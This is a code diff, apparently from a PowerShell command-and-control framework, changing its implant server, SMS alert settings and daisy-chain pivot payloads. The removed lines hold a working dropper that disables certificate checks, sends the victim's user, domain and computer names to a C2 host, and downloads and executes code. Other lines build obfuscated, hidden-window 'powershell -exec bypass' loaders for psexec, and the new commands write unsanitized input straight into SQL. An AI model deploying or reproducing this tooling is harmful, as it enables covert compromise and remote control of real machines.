@@ -284,6 +284,16 @@ $header = '
                 }
                 $HelpOutput = "Added autorun $tasker"
                 startup                
+            } elseif ($global:implantid.ToLower().StartsWith("set-clockworksmsapikey")) {
+                [string]$apikey = $global:implantid -replace "set-clockworksmsapikey ",""                                
+                $HelpOutput = "APIKey updated to: $apikey" 
+                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET APIKEY='$apikey'"|Out-Null
+                startup
+            } elseif ($global:implantid.ToLower().StartsWith("set-clockworksmsnumber")) {
+                [string]$MobileNumber = $global:implantid -replace "set-clockworksmsnumber ",""                                
+                $HelpOutput = "APIKey updated to: $MobileNumber" 
+                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET MobileNumber='$MobileNumber'"|Out-Null
+                startup
             } elseif ($global:implantid.ToLower().StartsWith("output-to-html"))
             {
                 $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
@@ -425,6 +435,8 @@ $header = '
         write-host "=====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
         write-host " Output-To-HTML"-ForegroundColor Green
+        write-host " Set-ClockworkSMSApiKey df2----"-ForegroundColor Green
+        write-host " Set-ClockworkSMSNumber 44789----"-ForegroundColor Green
         write-host " Set-DefaultBeacon 60"-ForegroundColor Green
         write-host " ListModules " -ForegroundColor Green
         write-host " PwnSelf (Alias: P)" -ForegroundColor Green
@@ -714,31 +726,16 @@ param(
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxyuser, 
 [Parameter(Mandatory=$true)][AllowEmptyString()][string]$proxypassword)
 
-$daisycommand = '$serverhost="'+$daisyserver+'"
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$serverport='+$port+'
-$server=$serverhost+":"+$serverport
-$d = (Get-Date -Format "dd/MM/yyyy")
-$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null)
-$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
-if ($k -lt $d) {exit} 
-function Get-Webclient ($Cookie) {
-$wc = New-Object System.Net.WebClient
-$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() 
-if ($cookie) {
-$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
-$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
-} $wc }
-function primer {
-$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;$server")
-$p64 = [Convert]::ToBase64String($pre)
-$pm = (Get-Webclient -Cookie $p64).downloadstring("$server/daisy")
-$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
-$pm } 
-$pm = primer
-if ($pm) {$pm| iex} else {
-start-sleep 10
-primer | iex }'
+$command = createdropper -Daisy 1 -killdate $killdatefm -domainfrontheader $domfront -ipv4address $c2server -serverport $c2port -username $proxyuser -password $proxypassword -proxyurl $proxyurl
+$payload = createrawpayload -command $command
+# create proxy payloads
+CreatePayload -DaisyName $name
+CreateStandAloneExe -DaisyName $name
+CreateServiceExe -DaisyName $name
+CreateDLL -DaisyName $name
+
+[IO.File]::WriteAllLines("$FolderPath\payloads\$($name).bat", $payload)
+Write-Host -Object "Payload written to: $FolderPath\payloads\$($name).bat"  -ForegroundColor Green
 
 
 $fdsf = @"
@@ -853,7 +850,7 @@ while (`$listener.IsListening)
 "@
 
 $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
-$fdsf | out-file c:\temp\test.txt
+
 $CompressedStream = New-Object IO.MemoryStream
 $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
 $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
@@ -864,12 +861,6 @@ $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
 $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
 $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
 $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))    
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($daisycommand)
-$payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
-$payload = $payloadraw -replace "`n", ""
-
-[IO.File]::WriteAllLines("$FolderPath\payloads\$($name).bat", $payload)
-Write-Host -Object "Payload written to: $FolderPath\payloads\$($name).bat"  -ForegroundColor Green
 
 $rundaisy = @"
 `$t = Invoke-Netstat| ? {`$_.ListeningPort -eq $port}
@@ -1098,7 +1089,7 @@ function invoke-psexecdaisypayload {
         $CompressedStream.Dispose()
         $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
         $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
-        return = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
+        return $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
     } else {
         write-host "Need to run Invoke-DaisyChain first"
         return $null
